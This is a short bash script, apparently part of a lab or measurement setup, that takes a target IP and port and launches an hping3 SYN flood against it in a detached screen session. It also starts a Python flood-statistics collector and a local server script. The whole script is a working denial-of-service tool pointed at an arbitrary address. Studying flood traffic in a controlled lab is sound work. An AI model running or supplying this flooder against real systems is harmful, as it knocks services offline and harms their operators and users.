#!/usr/bin/env bash

DIR=$(dirname $0)

. $DIR/config.sh

if [ $# -lt 2 ]
then
    echo "Usage: ./flooder.sh <dst ip> <dst port>"
    exit 1
fi

dst_ip="$1"
dst_port="$2"

mkdir -p $DIR/$SERVE_DIR

screen -dmSL ig-flooder hping3 -S --flood -V -p "$dst_port" "$dst_ip"

sleep 1

screen -dmSL ig-flood-stats python syn-flood-stats.py "$dst_ip" "$dst_port"

screen -dmSL ig-flood-server $DIR/server.sh


